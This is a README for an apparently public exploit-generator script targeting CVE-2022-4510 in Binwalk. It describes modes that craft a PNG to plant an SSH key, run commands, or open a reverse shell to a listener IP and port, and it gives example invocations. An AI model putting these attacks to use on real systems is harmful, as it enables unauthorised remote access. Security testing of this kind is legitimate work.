# CVE-2022-4510-Binwalk

This script allows you to generate exploits for targeting CVE-2022-4510 Binwalk vulnerabilities. The exploits can be used for testing and demonstrations. The supported options include SSH, command execution, and reverse shell.

## Prerequisites
- Python 3.x

## Usage
1. Clone the repository or download the script file.
2. Run the script with the desired options. The available options are:
   - `ssh`: Generate an exploit for SSH.
     - Arguments:
       - `file`: Path to the input .png file.
       - `pub`: Path to the public key file.
   - `command`: Generate an exploit for executing a command.
     - Arguments:
       - `--command`: Command to execute.
       - `file`: Path to the input .png file.
   - `reverse`: Generate an exploit for reverse shell.
     - Arguments:
       - `file`: Path to the input .png file.
       - `ip`: IP address of the listener.
       - `port`: Port number of the listener.

Example usages:
```
python exploit_generator.py ssh input.png public_key.pub
python exploit_generator.py command --command "ls -l" input.png
python exploit_generator.py reverse input.png 192.168.0.100 4444
```

## Output
The generated exploit will be saved as `binwalk_exploit.png` in the current directory.

## Disclaimer
Use this script responsibly and only on systems that you have permission to test or demonstrate vulnerabilities. The author is not responsible for any illegal or unauthorized use of this script.

## References
[https://github.com/electr0sm0g/CVE-2022-4510](https://github.com/electr0sm0g/CVE-2022-4510)
